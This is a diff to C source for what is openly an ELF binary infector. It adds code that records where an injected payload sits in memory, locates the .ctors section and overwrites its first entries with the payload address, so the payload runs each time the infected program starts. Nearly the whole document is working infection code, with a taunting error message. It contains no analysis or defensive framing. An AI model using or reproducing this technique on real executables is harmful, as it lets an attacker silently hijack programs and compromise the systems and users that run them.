@@ -87,6 +87,7 @@ int main(int argc, char *argv[]){
 
   //increase the size of the segment containing text to include the payload
   off_t payloadOffset = programHeader->p_filesz;
+  off_t payloadMemory = programHeader->p_vaddr + payloadOffset;
   (infectedProgramHeaderTable + i)->p_filesz += payloadSize;
   (infectedProgramHeaderTable + i)->p_memsz += payloadSize;
 
@@ -112,6 +113,26 @@ int main(int argc, char *argv[]){
       sectionHeader->sh_offset += alignedPayloadSize;
     }
   }
+
+  //find the string table
+  ELFN(Shdr) *infectedStringTable = infectedSectionHeaderTable + infectedElfHeader->e_shstrndx;
+  char* infectedStringTableValues = infected + infectedStringTable->sh_offset;
+
+
+  //find the .ctors
+  ELFN(Shdr) *ctors;
+  i = 0;
+  for( i = 0, ctors = infectedSectionHeaderTable;
+       i < infectedElfHeader->e_shnum && strcmp(infectedStringTableValues + ctors->sh_name, ".ctors") != 0;
+       i++, ctors++ ){}
+  if( i >= infectedElfHeader->e_shnum){
+    fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
+    return -1;
+  }
+
+  //add our payload to the ctors
+  *(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
+  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = -1;
 
 
   //write out the newly infected file
